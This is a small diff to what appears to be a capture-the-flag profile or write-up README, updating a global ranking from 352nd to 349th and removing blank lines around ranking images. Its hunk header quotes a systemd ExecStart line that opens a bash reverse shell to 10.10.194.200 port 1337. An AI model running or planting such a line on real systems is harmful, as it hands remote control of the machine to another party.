@@ -351,14 +351,10 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.194.200/1337 0>&1'
 
 </div>
 
-<p align="center"> Global All Time: 352ⁿᵈ<br><br><img width="900px" src="https://github.com/user-attachments/assets/1959739b-511b-4f19-9b39-750d613c94f3"> </p>
+<p align="center"> Global All Time:  349ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/1959739b-511b-4f19-9b39-750d613c94f3"> </p>
 
 <p align="center"> Brazil All Time: 8ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/123eca1f-8ef2-49e4-967f-0235547af297"> </p>
 
 <p align="center"> Global monthly: 772nd<br><br><img width="900px" src="https://github.com/user-attachments/assets/268ed383-6988-45f3-80f3-6692f22ad562"> </p>
 
 <p align="center"> Brazil monthly: 8ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/2e385bd1-466c-4cbe-bf3e-ad7de4a5783f"> </p>
-
-
-
-
